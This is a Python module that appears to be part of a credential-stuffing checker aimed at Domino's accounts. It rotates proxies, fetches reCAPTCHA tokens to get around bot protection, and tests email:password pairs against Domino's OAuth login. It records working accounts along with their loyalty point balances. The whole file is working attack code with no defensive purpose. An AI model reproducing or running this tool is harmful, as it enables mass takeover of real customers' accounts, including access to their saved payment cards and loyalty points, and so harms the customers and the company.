from modules.variables import Checker
from modules.functions import bad_proxy, log, save, set_proxy, return_proxy
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry
from uuid import uuid4
from time import time
from urllib.parse import quote

def check(email:str,password:str):
    while 1:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                uuid = str(uuid4())
                current_time = time()

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" ,
                    "Pragma": "no-cache" ,
                    "Accept": "*/*" ,
                }
                r = s.get('https://www.google.com/recaptcha/api2/anchor?ar=1&logging=true&k=6LcHcqoUAAAAAALG9ayDxyq5yuWSZ3c3pKWQnVwJ&co=aHR0cHM6Ly93d3cuZG9taW5vcy5jb206NDQz&hl=en&v=bfvuz6tShG5aoZp4K4zPVf5t&size=invisible&cb=ifn4tfce5kcr',headers=headers)
                token_1 = r.text.split("type=\"hidden\" id=\"recaptcha-token\" value=\"")[1].split("\"")[0]

                data = f"v=bfvuz6tShG5aoZp4K4zPVf5t&reason=q&c={token_1}&k=6LcHcqoUAAAAAALG9ayDxyq5yuWSZ3c3pKWQnVwJ&co=aHR0cHM6Ly93d3cuZG9taW5vcy5jb206NDQz&hl=en&size=invisible" 
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" ,
                    "Pragma": "no-cache" ,
                    "Accept": "*/*" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7" ,
                    "origin": "https://www.google.com" ,
                    "referer": r.url ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "same-origin" ,
                    "Content-Type":"application/x-www-form-urlencoded" 
                }
                r = s.post('https://www.google.com/recaptcha/api2/reload?k=6LcHcqoUAAAAAALG9ayDxyq5yuWSZ3c3pKWQnVwJ',headers=headers,data=data)
                token_2 = r.text.split("[\"rresp\",\"")[1].split("\"")[0]

                data = f"grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username={quote(email)}&password={quote(password)}" 
                headers = {
                    "Host": "authproxy.dominos.com" ,
                    "Connection": "keep-alive" ,
                    "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" ,
                    "DPZ-Language": "en" ,
                    "sec-ch-ua-mobile": "?0" ,
                    "Authorization": "bm9sby1ybTo=" ,
                    "Content-Type": "application/x-www-form-urlencoded" ,
                    "Accept": "application/json, text/javascript, */*; q=0.01" ,
                    "DPZ-Market": "UNITED_STATES" ,
                    "X-DPZ-D": uuid ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" ,
                    "Market": "UNITED_STATES" ,
                    "X-DPZ-CAPTCHA": f"google-recaptcha-v3-enterprise-gnolo;token={token_2};action=authproxyservice/tokenoauth2" ,
                    "Origin": "https://authproxy.dominos.com" ,
                    "Sec-Fetch-Site": "same-origin" ,
                    "Sec-Fetch-Mode": "cors" ,
                    "Sec-Fetch-Dest": "empty" ,
                    "Referer": "https://authproxy.dominos.com/assets/build/xdomain/proxy.html" ,
                    "Accept-Language": "en-US,en;q=0.9" ,
                    "Accept-Encoding": "gzip, deflate" ,
                }
                r = s.post('https://authproxy.dominos.com/auth-proxy-service/token.oauth2',headers=headers,data=data)
                if "We didn't recognize the username or password you entered" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "Please reset your password" in r.text or "authn.srvr.code.reset.password" in r.text:
                    if not Checker.cui: log("custom",":".join([email,password]),"Dominos")
                    save("Dominos","custom",Checker.time,":".join([email,password])+' | 2FA')
                    Checker.custom += 1
                    return_proxy(proxy)
                elif "access_token" not in r.text:
                    raise
                access_token = r.json()['access_token']

                data = "loyaltyIsActive=true&rememberMe=true&gRecaptchaResponse="
                headers = {
                    "Host": "order.dominos.com" ,
                    "Connection": "keep-alive" ,
                    "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" ,
                    "DPZ-Language": "en" ,
                    "sec-ch-ua-mobile": "?0" ,
                    "Authorization": f"Bearer {access_token}" ,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" ,
                    "Accept": "application/json, text/javascript, */*; q=0.01" ,
                    "DPZ-Market": "UNITED_STATES" ,
                    "X-DPZ-D": uuid ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" ,
                    "Market": "UNITED_STATES" ,
                    "Sec-Fetch-Site": "same-origin" ,
                    "Sec-Fetch-Mode": "cors" ,
                    "Sec-Fetch-Dest": "empty" ,
                    "Referer": "https://order.dominos.com/assets/build/xdomain/proxy.html" ,
                    "Accept-Language": "en-US,en;q=0.9" ,
                    "Accept-Encoding": "gzip, deflate",
                }
                r = s.post('https://order.dominos.com/power/login',headers=headers,data=data)
                user_id = r.json()['CustomerID']
                
                r = s.get(f"https://order.dominos.com/power/customer/{user_id}/loyalty?_={current_time}",headers=headers)
                points = r.json()['VestedPointBalance']

                if not Checker.cui: log("good",':'.join([email,password]),"Dominos")
                save("Dominos","good",Checker.time,':'.join([email,password])+f" | Points: {points}")
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        